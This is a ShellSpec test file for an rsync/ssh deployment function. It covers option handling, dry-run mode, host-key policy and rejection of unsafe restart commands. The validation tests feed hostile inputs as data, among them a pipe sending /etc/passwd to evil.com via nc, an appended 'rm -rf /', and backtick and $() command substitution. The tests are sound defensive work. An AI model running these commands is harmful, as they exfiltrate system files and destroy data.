Describe "deploy/ssh.sh"
  Include "$BRIK_PIPELINE_LIB/logging.sh"
  Include "$BRIK_PIPELINE_LIB/tools.sh"
  Include "$BRIK_PIPELINE_LIB/loader.sh"
  Include "$BRIK_TRANSVERSE_LIB/env.sh"
  Include "$BRIK_TRANSVERSE_LIB/config.sh"
  Include "$BRIK_TRANSVERSE_LIB/infra.sh"
  Include "$BRIK_TRANSVERSE_LIB/ssh.sh"
  Include "$BRIK_DEPLOYMENTS_LIB/ssh.sh"
  Include "$BRIK_HOME/spec/support/mock_helper.sh"

  # The ssh transport options come from the SshTarget the referential
  # declares for the host; every example gets an instance declaring the
  # spec's canonical host.
  setup_ssh_infra() {
    SSH_INFRA="$(mktemp -d)"
    mkdir -p "$SSH_INFRA/endpoints" "$SSH_INFRA/trust"
    printf 'apiVersion: brik.dev/referential/v1\nkind: Referential\nprofile: p-lab\n' \
      > "$SSH_INFRA/referential.yml"
    printf 'deploy.example.com ssh-ed25519 AAAAfixture\n' > "$SSH_INFRA/trust/known_hosts"
    cat > "$SSH_INFRA/endpoints/ssh-prod.yml" <<'YAML'
apiVersion: brik.dev/referential/v1
kind: SshTarget
name: ssh-prod
hosts:
  - deploy.example.com
known_hosts: file://trust/known_hosts
YAML
    export BRIK_INFRA_DIR="$SSH_INFRA"
  }
  cleanup_ssh_infra() { rm -rf "$SSH_INFRA"; unset BRIK_INFRA_DIR SSH_INFRA; }
  Before 'setup_ssh_infra'
  After 'cleanup_ssh_infra'

  Describe "deploy.ssh.run"
    It "returns 2 for unknown option"
      When call deploy.ssh.run --badopt foo
      The status should equal 2
      The stderr should include "unknown option"
    End

    # chantier 25: a workflow profile injects a k8s-centric `namespace`
    # default. deploy.sh filters it out for ssh (fix A), but ssh.run must
    # also tolerate it defensively. Probed via the missing-host early return.
    It "consumes --namespace instead of rejecting it as an unknown option"
      When call deploy.ssh.run --namespace staging
      The status should equal 2
      The stderr should not include "unknown option"
      The stderr should include "host is required"
    End

    It "returns 2 when --host is missing"
      When call deploy.ssh.run --path /srv/myapp
      The status should equal 2
      The stderr should include "host is required"
    End

    It "returns 2 when --path is missing"
      When call deploy.ssh.run --host deploy.example.com
      The status should equal 2
      The stderr should include "path is required"
    End

    Describe "require_tool rsync failure"
      setup_no_rsync() {
        mock.setup
        mock.isolate
      }
      cleanup_no_rsync() {
        mock.cleanup
      }
      Before 'setup_no_rsync'
      After 'cleanup_no_rsync'

      It "returns 3 when rsync is not on PATH"
        When call deploy.ssh.run --host deploy.example.com --path /srv/myapp
        The status should equal 3
        The stderr should include "required tool not found"
      End
    End

    Describe "require_tool ssh failure"
      setup_no_ssh() {
        mock.setup
        mock.create_exit "rsync" 0
        mock.isolate
      }
      cleanup_no_ssh() {
        mock.cleanup
      }
      Before 'setup_no_ssh'
      After 'cleanup_no_ssh'

      It "returns 3 when ssh is not on PATH"
        When call deploy.ssh.run --host deploy.example.com --path /srv/myapp
        The status should equal 3
        The stderr should include "required tool not found"
      End
    End

    Describe "with mock rsync and ssh"
      setup_tools() {
        mock.setup
        TEST_WS="$(mktemp -d)"
        MOCK_LOG="${TEST_WS}/mock_cmds.log"
        mock.create_logging "rsync" "$MOCK_LOG"
        mock.create_logging "ssh" "$MOCK_LOG"
        mock.activate
      }
      cleanup_tools() {
        mock.cleanup
        unset BRIK_DRY_RUN 2>/dev/null
        rm -rf "$TEST_WS"
      }
      Before 'setup_tools'
      After 'cleanup_tools'

      It "runs rsync with -avz --delete flags"
        invoke_rsync_flags() {
          deploy.ssh.run --host deploy.example.com --path /srv/myapp 2>/dev/null || return 1
          grep -q "\-avz" "$MOCK_LOG" && grep -q "\-\-delete" "$MOCK_LOG"
        }
        When call invoke_rsync_flags
        The status should be success
      End

      It "passes host:remote-path as rsync destination"
        invoke_rsync_dest() {
          deploy.ssh.run --host deploy.example.com --path /srv/myapp 2>/dev/null || return 1
          grep -q "deploy.example.com:/srv/myapp" "$MOCK_LOG"
        }
        When call invoke_rsync_dest
        The status should be success
      End

      It "uses --source as rsync source directory when provided"
        invoke_manifest_src() {
          deploy.ssh.run --host deploy.example.com --path /srv/myapp \
            --source "${TEST_WS}" 2>/dev/null || return 1
          grep -q "${TEST_WS}" "$MOCK_LOG"
        }
        When call invoke_manifest_src
        The status should be success
      End

      It "defaults to '.' as rsync source when --source not provided"
        invoke_default_src() {
          deploy.ssh.run --host deploy.example.com --path /srv/myapp 2>/dev/null || return 1
          grep -qE "rsync.*\.\s" "$MOCK_LOG" || grep -qE "rsync.* \.$" "$MOCK_LOG" || grep -q "rsync -avz --delete ." "$MOCK_LOG"
        }
        When call invoke_default_src
        The status should be success
      End

      It "executes --restart-cmd via ssh after rsync"
        invoke_restart() {
          deploy.ssh.run --host deploy.example.com --path /srv/myapp \
            --restart-cmd "systemctl restart myapp" 2>/dev/null || return 1
          grep -q "^ssh" "$MOCK_LOG"
        }
        When call invoke_restart
        The status should be success
      End

      It "passes restart-cmd to ssh"
        invoke_restart_cmd() {
          deploy.ssh.run --host deploy.example.com --path /srv/myapp \
            --restart-cmd "systemctl restart myapp" 2>/dev/null || return 1
          grep -q "systemctl restart myapp" "$MOCK_LOG"
        }
        When call invoke_restart_cmd
        The status should be success
      End

      It "skips ssh when no --restart-cmd"
        invoke_no_restart() {
          deploy.ssh.run --host deploy.example.com --path /srv/myapp 2>/dev/null || return 1
          # ssh should not be in log if no restart-cmd
          ! grep -q "^ssh" "$MOCK_LOG"
        }
        When call invoke_no_restart
        The status should be success
      End

      It "succeeds and reports deployment completed"
        When call deploy.ssh.run --host deploy.example.com --path /srv/myapp
        The status should be success
        The stderr should include "ssh deployment completed"
      End

      It "dry-run mode: uses rsync --dry-run flag"
        invoke_dryrun_rsync() {
          deploy.ssh.run --host deploy.example.com --path /srv/myapp \
            --dry-run 2>/dev/null || return 1
          grep -q "\-\-dry-run" "$MOCK_LOG"
        }
        When call invoke_dryrun_rsync
        The status should be success
      End

      It "dry-run mode: logs ssh command without executing it"
        invoke_dryrun_ssh_log() {
          deploy.ssh.run --host deploy.example.com --path /srv/myapp \
            --restart-cmd "systemctl restart myapp" \
            --dry-run 2>&1 | grep -q "\[dry-run\]"
        }
        When call invoke_dryrun_ssh_log
        The status should be success
      End

      It "dry-run mode: does not execute ssh restart"
        invoke_dryrun_nossh() {
          local log="${TEST_WS}/mock_cmds.log"
          deploy.ssh.run --host deploy.example.com --path /srv/myapp \
            --restart-cmd "systemctl restart myapp" \
            --dry-run 2>/dev/null
          [[ ! -f "$log" ]] || ! grep -q "^ssh" "$log"
        }
        When call invoke_dryrun_nossh
        The status should be success
      End
    End

    Describe "restart-cmd unsafe character validation"
      setup_unsafe() {
        mock.setup
        TEST_WS="$(mktemp -d)"
        MOCK_LOG="${TEST_WS}/mock_cmds.log"
        mock.create_logging "rsync" "$MOCK_LOG"
        mock.create_logging "ssh" "$MOCK_LOG"
        mock.activate
      }
      cleanup_unsafe() {
        mock.cleanup
        rm -rf "$TEST_WS"
      }
      Before 'setup_unsafe'
      After 'cleanup_unsafe'

      It "returns 2 when restart-cmd contains pipe character"
        When call deploy.ssh.run --host deploy.example.com --path /srv/app \
          --restart-cmd "cat /etc/passwd | nc evil.com 1234"
        The status should equal 2
        The stderr should include "unsafe characters"
      End

      It "returns 2 when restart-cmd contains backtick"
        When call deploy.ssh.run --host deploy.example.com --path /srv/app \
          --restart-cmd 'echo `whoami`'
        The status should equal 2
        The stderr should include "unsafe characters"
      End

      It "returns 2 when restart-cmd contains semicolon"
        When call deploy.ssh.run --host deploy.example.com --path /srv/app \
          --restart-cmd "systemctl restart app; rm -rf /"
        The status should equal 2
        The stderr should include "unsafe characters"
      End

      It "returns 2 when restart-cmd contains dollar sign"
        When call deploy.ssh.run --host deploy.example.com --path /srv/app \
          --restart-cmd 'echo $(whoami)'
        The status should equal 2
        The stderr should include "unsafe characters"
      End

      It "allows safe restart commands"
        invoke_safe_cmd() {
          deploy.ssh.run --host deploy.example.com --path /srv/app \
            --restart-cmd "systemctl restart my-app_v2" 2>/dev/null || return 1
        }
        When call invoke_safe_cmd
        The status should be success
      End
    End

    Describe "host-key policy from the declared SshTarget"
      setup_strict_host() {
        mock.setup
        TEST_WS="$(mktemp -d)"
        MOCK_LOG="${TEST_WS}/mock_cmds.log"
        mock.create_logging "rsync" "$MOCK_LOG"
        mock.create_logging "ssh" "$MOCK_LOG"
        mock.activate
      }
      cleanup_strict_host() {
        mock.cleanup
        rm -rf "$TEST_WS"
      }
      Before 'setup_strict_host'
      After 'cleanup_strict_host'

      It "defaults to strict host-key checking with the declared known_hosts"
        invoke_strict_default() {
          deploy.ssh.run --host deploy.example.com --path /srv/app 2>/dev/null || return 1
          grep -q "StrictHostKeyChecking=yes" "$MOCK_LOG" \
            && grep -q "UserKnownHostsFile=${SSH_INFRA}/trust/known_hosts" "$MOCK_LOG"
        }
        When call invoke_strict_default
        The status should be success
      End

      It "passes StrictHostKeyChecking=no when the SshTarget declares strict_host_key: false"
        invoke_strict_no() {
          yq -i '.strict_host_key = false | del(.known_hosts)' "$SSH_INFRA/endpoints/ssh-prod.yml"
          deploy.ssh.run --host deploy.example.com --path /srv/app 2>/dev/null || return 1
          grep -q "StrictHostKeyChecking=no" "$MOCK_LOG"
        }
        When call invoke_strict_no
        The status should be success
      End

      It "fails closed (7) for a host the referential does not declare"
        When call deploy.ssh.run --host ghost.example.com --path /srv/app
        The status should equal 7
        The stderr should include "ghost.example.com"
      End
    End

    Describe "passthrough options"
      setup_passthrough() {
        mock.setup
        TEST_WS="$(mktemp -d)"
        MOCK_LOG="${TEST_WS}/mock_cmds.log"
        mock.create_logging "rsync" "$MOCK_LOG"
        mock.create_logging "ssh" "$MOCK_LOG"
        mock.activate
      }
      cleanup_passthrough() {
        mock.cleanup
        rm -rf "$TEST_WS"
      }
      Before 'setup_passthrough'
      After 'cleanup_passthrough'

      It "silently ignores --target and --env options"
        When call deploy.ssh.run --host deploy.example.com --path /srv/app \
          --target prod --env staging
        The status should be success
        The stderr should include "ssh deployment completed"
      End
    End

    Describe "remote restart failure"
      setup_restart_fail() {
        mock.setup
        TEST_WS="$(mktemp -d)"
        MOCK_LOG="${TEST_WS}/mock_cmds.log"
        mock.create_logging "rsync" "$MOCK_LOG"
        mock.create_exit "ssh" 1
        mock.activate
      }
      cleanup_restart_fail() {
        mock.cleanup
        rm -rf "$TEST_WS"
      }
      Before 'setup_restart_fail'
      After 'cleanup_restart_fail'

      It "returns 5 when remote restart command fails"
        When call deploy.ssh.run --host deploy.example.com --path /srv/app \
          --restart-cmd "systemctl restart myapp"
        The status should equal 5
        The stderr should include "remote restart command failed"
      End
    End

    Describe "with failing rsync"
      setup_fail_rsync() {
        mock.setup
        TEST_WS="$(mktemp -d)"
        mock.create_exit "rsync" 1
        mock.create_exit "ssh" 0
        mock.activate
      }
      cleanup_fail_rsync() {
        mock.cleanup
        unset BRIK_DRY_RUN 2>/dev/null
        rm -rf "$TEST_WS"
      }
      Before 'setup_fail_rsync'
      After 'cleanup_fail_rsync'

      It "returns 5 when rsync fails"
        When call deploy.ssh.run --host deploy.example.com --path /srv/myapp
        The status should equal 5
        The stderr should include "rsync failed"
      End
    End

    Describe "BRIK_DRY_RUN env var"
      setup_env_dryrun() {
        mock.setup
        TEST_WS="$(mktemp -d)"
        MOCK_LOG="${TEST_WS}/mock_cmds.log"
        mock.create_logging "rsync" "$MOCK_LOG"
        mock.create_logging "ssh" "$MOCK_LOG"
        mock.activate
        export BRIK_DRY_RUN="true"
      }
      cleanup_env_dryrun() {
        mock.cleanup
        unset BRIK_DRY_RUN 2>/dev/null
        rm -rf "$TEST_WS"
      }
      Before 'setup_env_dryrun'
      After 'cleanup_env_dryrun'

      It "respects BRIK_DRY_RUN env var and uses rsync --dry-run"
        invoke_env_dryrun() {
          deploy.ssh.run --host deploy.example.com --path /srv/myapp 2>/dev/null || return 1
          grep -q "\-\-dry-run" "$MOCK_LOG"
        }
        When call invoke_env_dryrun
        The status should be success
      End
    End


    Describe "double-sourcing guard"
      It "is callable after double include"
        double_include() {
          # shellcheck source=/dev/null
          . "$BRIK_DEPLOYMENTS_LIB/ssh.sh"
          declare -f deploy.ssh.run >/dev/null && echo "ok" || echo "missing"
        }
        When call double_include
        The output should equal "ok"
      End
    End
  End
End
